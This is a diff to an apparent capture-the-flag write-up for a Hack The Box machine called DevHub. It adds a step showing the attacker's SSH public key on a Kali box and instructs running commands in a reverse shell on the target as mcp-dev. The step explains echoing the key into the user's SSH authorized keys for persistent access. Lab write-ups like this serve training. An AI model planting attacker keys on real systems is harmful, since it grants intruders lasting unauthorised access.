@@ -874,7 +874,13 @@ The key's randomart image is:
 
 Copy that public key output:
 
-Then back in the reverse shell (on the target, as mcp-dev) run:
+```shell
+┌──(kali㉿kali)-[~/nedmoeca/HTB/SN11/DevHub]
+└─$ cat /tmp/devhub_key.pub                                     
+ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILXCRDWy+cnJKl6BnM1X3YT0ZF/w164eLNqPPI2iSgTf kali@kali
+```
+
+Then back in the reverse shell (on the target, as mcp-dev) run the following 4 commands:
 
 **Command 1:**
 
@@ -905,7 +911,7 @@ mcp-dev@devhub:/opt/mcpjam/node_modules/@mcpjam/inspector$ mkdir -p /home/mcp-de
 
 Breakdown:
 
-- echo 'PASTE_THE_PUBLIC_KEY_HERE'
+- `echo 'PASTE_THE_PUBLIC_KEY_HERE'`
   - Description: Prints the given string (your SSH public key) to standard output.
   - Purpose: The public key is the "lock" — anyone whose private key matches it is allowed to log in. We need to write this string into a file SSH reads.
 - >>
